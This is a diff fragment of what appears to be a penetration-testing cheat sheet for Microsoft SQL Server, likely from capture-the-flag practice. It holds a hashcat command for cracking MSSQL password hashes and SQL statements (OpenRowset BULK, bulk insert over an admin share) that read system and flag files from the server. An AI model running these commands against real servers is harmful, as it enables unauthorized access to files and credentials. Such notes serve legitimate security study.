@@ -77,12 +77,12 @@ hashcat -m 2000 mssql.hash ~/rockyou.txt -O
 ```
 ##### Read and copy file
 ```sql
-select x from OpenRowset(BULK 'C:\Users\Administrator\root.txt',SINGLE_CLOB) R(x)
+select x from OpenRowset(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) R(x)
 
 select x from OpenRowset(BULK 'C:\windows\win.ini',SINGLE_CLOB) R(x)
 
 create table #errortable (ignore int)
-bulk insert #errortable from '\\localhost\c$\windows\win.ini' with ( fieldterminator=',', rowterminator='\n', errorfile='c:\programdata\thatjusthappend.txt' )
+bulk insert #errortable from '\\localhost\c$\windows\win.ini' with ( fieldterminator=',', rowterminator='\n', errorfile='c:\thatjusthappend.txt' )
 ```
 ##### Write local files
 ```bash
